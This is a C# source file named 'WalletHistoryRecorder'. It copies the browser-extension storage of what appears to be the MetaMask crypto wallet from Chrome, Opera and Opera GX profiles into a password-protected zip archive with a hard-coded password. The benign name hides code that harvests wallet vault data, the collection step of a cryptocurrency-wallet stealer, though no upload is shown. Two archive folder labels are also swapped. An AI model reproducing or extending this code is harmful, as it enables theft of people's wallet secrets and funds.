using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace WalletHistoryRecorder
{
	public static class FileClass
	{
		static string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		static readonly string chromeWalletDirectory = userPath + @"\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn";
		static readonly string operaWalletDirectory = userPath + @"\AppData\Roaming\Opera Software\Opera Stable\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn";
		static readonly string operaGxWalletDirectory = userPath + @"\AppData\Roaming\Opera Software\Opera GX Stable\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn";

		static readonly string chromeWD = @".\chrome";
		static readonly string operaWD = @".\opera";
		static readonly string operaGxWD = @".\operagx";

		static string outputPath = @".\output";
		
		static List<string> paths;

		
		private static string password = "Passw0rd!";

		public static string[] CreateZip()
		{
			string fileName = DateTime.Now.Day + "." + DateTime.Now.Month + "." + DateTime.Now.Year + "_" + DateTime.Now.Hour + "." + DateTime.Now.Minute + ".zip";
			if (!Directory.Exists(outputPath)) Directory.CreateDirectory(outputPath);

			string outputZipFile = outputPath + "\\" + fileName;
			
			if (File.Exists(outputZipFile))
			{
				File.Delete(outputZipFile);
			}

			// create a file with encryption
			using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile())
			{



				int count = 0;
				zip.Password = password;
				if (Directory.Exists(chromeWalletDirectory))
				{
					if (Directory.Exists(chromeWD))
						Directory.Delete(chromeWD, true);
					Directory.CreateDirectory(chromeWD);
						
					DirectoryCopy(chromeWalletDirectory, chromeWD, true);
					zip.AddDirectory(chromeWD, "Chrome");
					count++;
				}

				if (Directory.Exists(operaWalletDirectory))
				{
					if (Directory.Exists(operaWD))
						Directory.Delete(operaWD, true);
					Directory.CreateDirectory(operaWD);
					DirectoryCopy(operaWalletDirectory, operaWD, true);
					zip.AddDirectory(operaWD, "Opera Gx");
					count++;
				}

				if (Directory.Exists(operaGxWalletDirectory))
				{
					if (Directory.Exists(operaGxWD))
						Directory.Delete(operaGxWD, true);
					Directory.CreateDirectory(operaGxWD);
					DirectoryCopy(operaGxWalletDirectory, operaGxWD, true);
					zip.AddDirectory(operaGxWD, "Opera");
					count++;
				}

				if (count > 0)
				{
					zip.Save(outputZipFile);
				}
				else
				{
					throw new Exception("Hicbir uygulama yuklu degil!");
				}

			}

			return new string[] {
				outputZipFile,
				fileName
			};

		}

		private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
		{
			// Get the subdirectories for the specified directory.
			DirectoryInfo dir = new DirectoryInfo(sourceDirName);

			if (!dir.Exists)
			{
				throw new DirectoryNotFoundException(
					"Source directory does not exist or could not be found: "
					+ sourceDirName);
			}

			DirectoryInfo[] dirs = dir.GetDirectories();

			// If the destination directory doesn't exist, create it.       
			Directory.CreateDirectory(destDirName);

			// Get the files in the directory and copy them to the new location.
			FileInfo[] files = dir.GetFiles();
			foreach (FileInfo file in files)
			{
				string tempPath = Path.Combine(destDirName, file.Name);
				file.CopyTo(tempPath, false);
			}

			// If copying subdirectories, copy them and their contents to new location.
			if (copySubDirs)
			{
				foreach (DirectoryInfo subdir in dirs)
				{
					string tempPath = Path.Combine(destDirName, subdir.Name);
					DirectoryCopy(subdir.FullName, tempPath, copySubDirs);
				}
			}
		}


		private static void TestDirectories()
		{
			paths = new List<string>();
			if (!Directory.Exists(chromeWalletDirectory))
			{
				throw new Exception("Wrong directory!");
			}
		}

		private static bool DirectoryExists(string path)
		{
			if (File.Exists(path))
			{
				// This path is a file
				ProcessFile(path);
				return true;
			}
			else if (Directory.Exists(path))
			{
				// This path is a directory
				ProcessDirectory(path);
				return true;
			}
			else
			{
				Console.WriteLine("{0} is not a valid file or directory.", path);
				return false;
			}
		}

		// Process all files in the directory passed in, recurse on any directories
		// that are found, and process the files they contain.
		private static void ProcessDirectory(string targetDirectory)
		{
			// Process the list of files found in the directory.
			string[] fileEntries = Directory.GetFiles(targetDirectory);
			foreach (string fileName in fileEntries)
				ProcessFile(fileName);

			// Recurse into subdirectories of this directory.
			string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
			foreach (string subdirectory in subdirectoryEntries)
				ProcessDirectory(subdirectory);
		}

		// Insert logic for processing found files here.
		public static void ProcessFile(string path)
		{
			paths.Add(path);
		}
	}
}
